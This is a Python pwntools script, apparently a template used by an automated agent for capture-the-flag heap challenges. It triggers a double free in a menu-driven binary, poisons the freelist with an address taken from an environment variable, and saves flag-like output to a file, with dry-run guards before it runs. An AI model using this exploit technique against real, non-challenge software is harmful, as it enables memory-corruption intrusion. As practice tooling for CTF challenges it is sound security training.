#!/usr/bin/env python3
from pwn import *
import os
import re

BIN = os.getenv("BIN", "./chall")
LIBC = os.getenv("LIBC", "./libc.so.6")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.log_level = os.getenv("LOG", "info")

ALLOC = os.getenv("ALLOC", "1")
FREE = os.getenv("FREE", "2")
PROMPT = os.getenv("PROMPT", "> ").encode()
SIZE_PROMPT = os.getenv("SIZE_PROMPT", "size: ").encode()
INDEX_PROMPT = os.getenv("INDEX_PROMPT", "index: ").encode()
DATA_PROMPT = os.getenv("DATA_PROMPT", "data: ").encode()


def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    match = re.search(FLAG_RE, data)
    if match:
        flag = match.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


def alloc(io, size, data=b"A"):
    io.sendlineafter(PROMPT, ALLOC.encode())
    io.sendlineafter(SIZE_PROMPT, str(size).encode())
    io.sendlineafter(DATA_PROMPT, data if isinstance(data, bytes) else data.encode())


def free(io, idx):
    io.sendlineafter(PROMPT, FREE.encode())
    io.sendlineafter(INDEX_PROMPT, str(idx).encode())


if __name__ == "__main__":
    log.info("heap-double-free helper template loaded")
    log.info("Use only after proving same-bin double free is real; do not assume glibc accepts it.")

    if os.getenv("RUN", "0") != "1":
        raise SystemExit("Dry-run only. Set RUN=1 after confirming allocator/version and duplicate-free oracle.")

    io = start()
    chunk_size = int(os.getenv("CHUNK_SIZE", "32"), 0)
    target = int(os.getenv("TARGET", "0"), 0)

    # Minimal double-free proof skeleton:
    # 1) alloc A/B to same bin
    # 2) free A
    # 3) free B (guard chunk)
    # 4) free A again if challenge allows
    # 5) allocate twice to see whether freelist control is possible
    alloc(io, chunk_size, b"A" * 8)
    alloc(io, chunk_size, b"B" * 8)
    free(io, 0)
    free(io, 1)
    free(io, 0)

    log.info("double-free sequence sent; now verify whether allocator rejected, aborted, or accepted the state")

    if target:
        alloc(io, chunk_size, p64(target))
        alloc(io, chunk_size, b"C" * 8)
        alloc(io, chunk_size, b"D" * 8)
        emit(io.recv(timeout=1) if io.can_recv(timeout=1) else b"")
    else:
        raise SystemExit("Double-free proof complete. Set TARGET to continue with poisoning validation.")
